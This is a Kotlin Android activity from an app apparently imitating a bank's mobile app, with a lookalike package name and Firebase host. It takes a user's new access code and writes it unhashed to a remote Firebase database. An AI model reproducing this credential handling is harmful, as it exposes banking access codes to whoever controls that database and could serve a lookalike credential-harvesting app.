package com.bank.bcamobiie.activity

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.bank.bcamobiie.R
import com.bank.bcamobiie.databinding.ActivitySuccesInputBinding
import com.bank.bcamobiie.databinding.AlertWrongCodeAccesBinding
import com.bank.bcamobiie.datastore.Userdata
import com.bank.bcamobiie.viewmodel.InputDataViewModel
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.Query
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.koin.androidx.viewmodel.ext.android.viewModel

class SuccesInputActivity : AppCompatActivity() {

    private var _binding: ActivitySuccesInputBinding? = null
    private val binding: ActivitySuccesInputBinding get() = _binding!!

    private var _alertWrong: AlertWrongCodeAccesBinding? = null
    private val alertWrong: AlertWrongCodeAccesBinding get() = _alertWrong!!

    private val viewModel: InputDataViewModel by viewModel()

    private lateinit var idKartu: String
    private lateinit var kodeAksesBaru: String
    private lateinit var database: DatabaseReference


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivitySuccesInputBinding.inflate(layoutInflater)
        setContentView(binding.root)
        supportActionBar?.hide()

        database = FirebaseDatabase.getInstance("https://bca-mobiile-default-rtdb.firebaseio.com/").reference

        binding.apply {

            idKartu = intent.getStringExtra(DATA_NOREK)!!
            val code1 = inputCodeAcces.text
            val code2 = inputCodeAcces2.text

            btnOkAccesCode.setOnClickListener {
                if (code1.toString() == code2.toString() && code1.toString() != "" && code2.toString() !="") {
                    viewModel.saveSession(Userdata(idKartu, code1.toString(), true))
                    kodeAksesBaru = code1.toString()
                    updateKodeAkses()

                } else if (code1.toString() == "" || code2.toString() ==""){
                    showAlertpPaswordNull()
                }else{
                    showAlert()
                }
            }
        }

    }

    private fun updateKodeAkses() {
        lifecycleScope.launch(Dispatchers.IO) {
            val query: Query = database.child("data_akun").orderByChild("idKartu").equalTo(idKartu)
            query.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(dataSnapshot: DataSnapshot) {
                    if (dataSnapshot.exists()) {
                        for (snapshot in dataSnapshot.children) {
                            val key = snapshot.key
                            if (key != null) {
                                database.child("data_akun").child(key).child("kodeAcces").setValue(kodeAksesBaru)
                                    .addOnCompleteListener { task ->
                                        if (task.isSuccessful) {
                                            val intent = Intent(this@SuccesInputActivity, MainActivity::class.java)
                                            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
                                            startActivity(intent)
                                            finish()
                                        }
                                    }
                            }
                            break
                        }
                    }
                }

                override fun onCancelled(databaseError: DatabaseError) {
                }
            })
        }

    }



    private fun showAlert() {
        val alertBuilder = AlertDialog.Builder(this)
        _alertWrong = AlertWrongCodeAccesBinding.inflate(layoutInflater)
        val view = alertWrong.root
        alertBuilder.setView(view)
        val dialog = alertBuilder.create()
        dialog.setCanceledOnTouchOutside(false)
        dialog.show()
        dialog.window?.setLayout(850, 1000)
        alertWrong.apply {
            btnOkInccoreCode.setOnClickListener {
                dialog.dismiss()
            }
        }
    }

    private fun showAlertpPaswordNull() {
        val alertBuilder = AlertDialog.Builder(this)
        _alertWrong = AlertWrongCodeAccesBinding.inflate(layoutInflater)
        val view = alertWrong.root
        alertBuilder.setView(view)
        val dialog = alertBuilder.create()
        dialog.setCanceledOnTouchOutside(false)
        dialog.show()
        dialog.window?.setLayout(850, 1000)
        alertWrong.apply {
            tvErrorMessage.text = getString(R.string.message_null)
            btnOkInccoreCode.setOnClickListener {
                dialog.dismiss()
            }
        }
    }

    companion object {
        const val DATA_NOREK = "data norek"
        const val DATA_PW = "data pw"
    }

}